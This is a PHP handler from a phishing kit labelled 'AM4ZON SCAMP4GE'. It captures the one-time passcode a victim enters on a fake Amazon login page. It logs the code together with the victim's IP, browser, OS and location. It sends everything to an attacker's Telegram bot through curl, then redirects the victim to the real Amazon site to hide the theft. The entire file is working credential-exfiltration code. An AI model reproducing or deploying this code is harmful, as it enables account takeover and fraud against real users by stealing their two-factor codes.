<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/
session_start();
error_reporting(0);
include('function.php');
$settings = include('../config.php');
require_once __DIR__ . '/../storage/storage.php';

$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';

if ($otp === '') {
    header('Location: otp.php?error=1');
    exit;
}

$payload = [
    'otp' => $otp,
];

append_login_session_step(session_id(), 'otp', $payload);

$message = "🔥 AM4ZON OTP FROM - {$IP} 🔥\n\n";
$message .= "➤ [ OTP ] : {$otp}\n";
$message .= "--------- MORE INFO -----------\n";
$message .= "➤ [ IP Address ] : {$IP}\n";
$message .= "➤ [ User-Agent ] : {$useragent}\n";
$message .= "➤ [ OS ]         : {$os}\n";
$message .= "➤ [ Browser ]    : {$browser}\n";
$message .= "➤ [ City(IP) ]   : {$city}\n";
$message .= "➤ [ Country ]    : {$countryname}\n";
$message .= "➤ [ Date ]       : {$date}\n";
$message .= ".--------------------------------.\n";

if (
    $settings['telegram'] == "1"
    && function_exists('curl_init')
    && !empty($settings['bot_url'])
    && !empty($settings['chat_id'])
) {
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
} else {
  // Telegram disabled or misconfigured; skipping cURL request.
}

if (is_afk_enabled()) {
    header('Location: https://www.amazon.com');
} else {
    header('Location: dashboard.php?otp_submitted=1');
}
exit;
?>
